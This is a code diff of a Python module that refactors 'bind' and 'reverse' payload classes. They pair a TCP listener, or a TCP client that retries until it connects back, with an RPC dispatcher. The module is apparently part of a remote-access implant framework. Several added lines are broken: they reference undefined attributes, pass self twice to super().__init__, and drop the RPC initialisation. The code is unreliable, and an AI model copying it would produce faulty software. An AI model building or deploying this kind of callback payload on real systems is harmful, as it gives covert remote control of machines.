@@ -9,7 +9,7 @@ from .. import sock
 from .. import rpc
 
 
-class PayloadRPCDispatcher(rpc.RPCHandler):
+class PayloadRPCHandler(rpc.RPCHandler):
     ''' Mix-in class that dispatches RPC requests. '''
 
     def rpc_dir(self):
@@ -28,41 +28,27 @@ class PayloadRPCDispatcher(rpc.RPCHandler):
 class PayloadRequestHandler(socketserver.BaseRequestHandler):
 
     def handle(self):
-        #self.server.handle_request(self.request)
-        data = self.decode_request_data(data)
-        response = self.server._marshalled_dispatch(data)
-
-    def decode_request_data(self, data):
-        return data
+        self.rpc.handle_connection(self.connection)
 
 
-class TCPBindPayload(socketserver.TCPServer, PayloadRPCDispatcher):
+class TCPBindPayload(socketserver.TCPServer, PayloadRPCHandler):
+    RequestHandler = PayloadRequestHandler
+    Connection = sock.Connection
 
-    def __init__(self, addr, requestHandler=PayloadRequestHandler,
-            logRequests=True, allow_none=False, encoding=None,
-            bind_and_activate=True, use_builtin_types=False):
-        self.logRequests = logRequests
-
-        #PayloadRPCDispatcher.__init__(self, allow_none, encoding, use_builtin_types)
-        PayloadRPCDispatcher.__init__(self)
-        socketserver.TCPServer.__init__(self, addr, requestHandler, bind_and_activate)
-
-    def handle_request(self, request):
-        conn = sock.Connection(request)
-        return self.handle_connection(conn)
+    def __init__(self, server_address, RequestHandler=None,
+            bind_and_activate=True):
+        super().__init__(self, server_address,
+                RequestHandler,
+                bind_and_activate,
+        )
 
 
-class TCPReversePayload(sock.TCPClient, PayloadRPCDispatcher):
+class TCPReversePayload(sock.TCPClient, PayloadRPCHandler):
+    RequestHandler = PayloadRequestHandler
+    Connection = sock.Connection
     
     def __init__(self, addr, retry_interval=1):
-        PayloadRPCDispatcher.__init__(self)
         sock.TCPClient.__init__(self, addr, retry_interval)
-
-    def __enter__(self):
-        return self
-
-    def __exit__(self, *args, **kwargs):
-        pass
 
 
 def uname():
